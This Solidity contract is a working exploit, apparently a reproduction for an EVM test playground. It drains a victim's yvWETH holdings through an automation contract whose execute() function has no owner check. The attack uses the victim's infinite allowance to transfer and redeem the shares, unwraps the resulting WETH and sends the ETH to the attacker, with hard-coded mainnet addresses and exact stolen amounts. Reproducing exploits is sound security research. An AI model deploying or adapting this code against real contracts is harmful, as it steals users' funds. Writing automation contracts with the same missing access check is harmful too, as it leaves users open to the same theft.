// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone synthetic exploit for the EVM Playground.
// Abuses the victim's personal automation: execute((uint8,bytes)[]) has no
// owner check, while the victim EOA granted infinite yvWETH allowance to it.
// Not a Yearn core/strategy bug — StrategystETHAccumulatorV3 / StrategyRouterV3
// only appear as the vault's normal withdrawal path when shares are redeemed.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IWeth is IERC20 {
    function withdraw(uint256) external;
}

interface IYvWETH is IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    // Yearn v2: withdraw(maxShares, recipient, maxLoss)
    function withdraw(uint256 maxShares, address recipient, uint256 maxLoss) external returns (uint256);
}

interface IAutomation {
    struct Call {
        uint8 kind;
        bytes data;
    }
    function execute(Call[] calldata calls) external;
}

contract YearnStETHAccumulatorExploit {
    address constant AUTOMATION = 0x143A737bfFC6414b61134F513CEED1a64390181A;
    address constant VICTIM = 0x98289E90d6fC92a8769bC892D006A2Baa7705aFE;
    address constant YVWETH = 0xa258C4606Ca8206D8aA700cE2143D7db854D168c;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    // Exact historical shares drained
    uint256 constant STOLEN_SHARES = 384_667_252_984_919_210_375;
    uint256 constant EXPECTED_PROFIT = 429_210_570_004_163_139_903;

    address public immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    receive() external payable {}

    function attack() external {
        require(msg.sender == owner, "not owner");

        uint256 shares = IYvWETH(YVWETH).balanceOf(VICTIM);
        require(shares == STOLEN_SHARES, "share mismatch");
        require(IYvWETH(YVWETH).allowance(VICTIM, AUTOMATION) >= shares, "no allowance");

        // Historical execute payload (kinds 2,2,3):
        //  1) yvWETH.transferFrom(victim, automation, shares)
        //  2) yvWETH.withdraw(shares, automation, 10000)  // maxLoss bps
        //  3) WETH.transfer(this, full automation WETH balance)
        IAutomation.Call[] memory calls = new IAutomation.Call[](3);

        calls[0] = IAutomation.Call({
            kind: 2,
            data: abi.encode(
                YVWETH,
                uint256(0),
                abi.encodeWithSelector(
                    bytes4(0x23b872dd), // transferFrom
                    VICTIM,
                    AUTOMATION,
                    shares
                )
            )
        });

        calls[1] = IAutomation.Call({
            kind: 2,
            data: abi.encode(
                YVWETH,
                uint256(0),
                abi.encodeWithSelector(
                    bytes4(0xe63697c8), // withdraw(uint256,address,uint256)
                    shares,
                    AUTOMATION,
                    uint256(10_000)
                )
            )
        });

        // kind 3: transfer WETH balance of automation → this exploit
        calls[2] = IAutomation.Call({
            kind: 3,
            data: abi.encode(WETH, address(this), uint256(0))
        });

        // Permissionless — no owner check on execute
        IAutomation(AUTOMATION).execute(calls);

        uint256 wethBal = IWeth(WETH).balanceOf(address(this));
        require(wethBal == EXPECTED_PROFIT, "weth mismatch");
        IWeth(WETH).withdraw(wethBal);

        uint256 profit = address(this).balance;
        require(profit == EXPECTED_PROFIT, "eth mismatch");
        (bool ok, ) = owner.call{value: profit}("");
        require(ok, "eth send failed");
    }
}
